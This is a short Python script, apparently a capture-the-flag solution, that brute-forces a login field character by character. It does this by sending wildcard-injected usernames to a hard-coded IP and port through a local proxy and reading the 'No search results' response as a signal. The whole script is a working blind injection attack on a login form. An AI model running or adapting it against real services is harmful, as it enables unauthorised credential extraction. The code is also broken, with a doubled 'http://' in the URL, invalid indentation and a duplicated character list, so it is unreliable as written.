
import requests

list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '!', '#', '$', '%', '&','0', '9', '8', '7', '6', '5', '4', '3', '2', '1', '>', '<', '.', '?', '!', '-', '_', '(', ')', '^', '~', '`', '=', '+']

url = 'http://http://206.189.26.97:31338/login'
myobj = {'username': 'somevalue', 'password': '*'}
result = ''

flag = 1
    while flag == 1:
        flag = 0
        for l in list: 
                 myobj['username'] = result + l + '*'
                 r = requests.post(url, data = myobj, proxies = { "http" : "http://127.0.0.1:9001"})
                 if ('No search results' in r.text):
                         result += l
                         flag = 1
                         print(result)
                         break

print('finito!')



